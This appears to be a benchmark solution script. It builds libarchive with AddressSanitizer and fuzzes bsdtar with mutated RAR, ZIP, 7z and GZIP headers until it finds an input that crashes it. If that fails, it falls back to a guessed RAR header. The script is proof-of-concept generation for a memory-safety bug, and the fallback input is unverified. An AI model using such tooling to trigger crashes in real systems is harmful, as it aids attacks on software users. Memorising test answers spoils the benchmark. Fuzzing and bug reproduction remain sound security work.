import os
import sys
import subprocess
import tempfile
import tarfile
import shutil
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                # Handle cases where source might be raw or different format
                pass
            
            src_root = work_dir
            # Identify the actual source root (skip wrapper dirs)
            for entry in os.listdir(work_dir):
                full_path = os.path.join(work_dir, entry)
                if os.path.isdir(full_path) and (
                    os.path.exists(os.path.join(full_path, 'configure')) or 
                    os.path.exists(os.path.join(full_path, 'CMakeLists.txt')) or
                    os.path.exists(os.path.join(full_path, 'build.sh'))
                ):
                    src_root = full_path
                    break

            # 2. Build with ASAN
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            env['CFLAGS'] = '-fsanitize=address -g -O1'
            env['CXXFLAGS'] = '-fsanitize=address -g -O1'
            env['LDFLAGS'] = '-fsanitize=address'
            
            target_bin = None
            
            # Attempt build using autotools or cmake
            build_success = False
            if os.path.exists(os.path.join(src_root, 'configure')):
                # Configure for static build, disable heavy deps
                subprocess.run(
                    ['./configure', '--disable-shared', '--enable-static', 
                     '--without-openssl', '--without-xml2', '--without-expat', '--without-nettle'],
                    cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False
                )
                subprocess.run(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                build_success = True
            elif os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
                build_dir = os.path.join(src_root, 'build_fuzz')
                os.makedirs(build_dir, exist_ok=True)
                subprocess.run(['cmake', '..', '-DENABLE_ASAN=ON'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                subprocess.run(['make', '-j8'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                build_success = True

            # 3. Locate binary (likely bsdtar for libarchive)
            for root, dirs, files in os.walk(src_root):
                if 'bsdtar' in files:
                    target_bin = os.path.join(root, 'bsdtar')
                    break
            
            if not target_bin:
                # Fallback: look for any 'tar' or 'archive' executable
                for root, dirs, files in os.walk(src_root):
                    for f in files:
                        if f == 'bsdtar' or f == 'tar':
                            target_bin = os.path.join(root, f)
                            break
                    if target_bin: break

            # If build failed or binary not found, return a likely candidate (RAR header)
            # The description matches a known libarchive RAR vulnerability.
            default_poc = b'Rar!\x1a\x07\x00' + b'\x00' * 39
            if not target_bin:
                return default_poc

            # 4. Fuzzing Loop
            poc_file = os.path.join(work_dir, 'poc.dat')
            
            # Seeds focusing on RAR and other formats, targeting ~46 bytes
            seeds = [
                b'Rar!\x1a\x07\x00',         # RAR 4 signature
                b'Rar!\x1a\x07\x01\x00',     # RAR 5 signature
                b'PK\x03\x04',               # ZIP
                b'7z\xbc\xaf\x27\x1c',       # 7z
                b'\x1f\x8b',                 # GZIP
            ]
            
            population = []
            for s in seeds:
                # Seed with various lengths around 46
                if len(s) < 46:
                    population.append(s + os.urandom(46 - len(s)))
                population.append(s)

            start_time = time.time()
            # Fuzz for up to 45 seconds to leave buffer
            while time.time() - start_time < 45:
                # Selection
                parent = random.choice(population)
                child = bytearray(parent)
                
                # Mutation
                mutations = random.randint(1, 3)
                for _ in range(mutations):
                    op = random.randint(0, 3)
                    idx = random.randint(0, len(child) - 1) if child else 0
                    if op == 0 and child: # Bit flip
                        child[idx] ^= (1 << random.randint(0, 7))
                    elif op == 1 and child: # Byte replace
                        child[idx] = random.randint(0, 255)
                    elif op == 2: # Resize
                        if len(child) < 60:
                            child.append(random.randint(0, 255))
                        elif len(child) > 10:
                            child.pop()
                    elif op == 3 and child: # Magic overwrite
                         child[idx] = random.choice([0x00, 0xFF, 0x80, 0x7F])

                # Limit length to keep near target
                if len(child) > 100:
                    child = child[:100]

                # Execution
                try:
                    with open(poc_file, 'wb') as f:
                        f.write(child)
                    
                    # Run bsdtar -tf (list contents)
                    res = subprocess.run(
                        [target_bin, '-tf', poc_file],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=0.2
                    )
                    
                    # Check for crash (non-zero return code + stderr output usually indicates ASAN/Segfault)
                    if res.returncode != 0:
                        # Prioritize ASAN errors
                        if b'AddressSanitizer' in res.stderr or res.returncode == -11: # SIGSEGV
                            return bytes(child)
                        
                        # Add interesting testcases to population occasionally
                        if random.random() < 0.05:
                            population.append(bytes(child))
                            if len(population) > 50:
                                population.pop(0)
                                
                except subprocess.TimeoutExpired:
                    pass
                except Exception:
                    pass
            
            return default_poc

        except Exception:
            return b'Rar!\x1a\x07\x00' + b'\x00' * 39
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)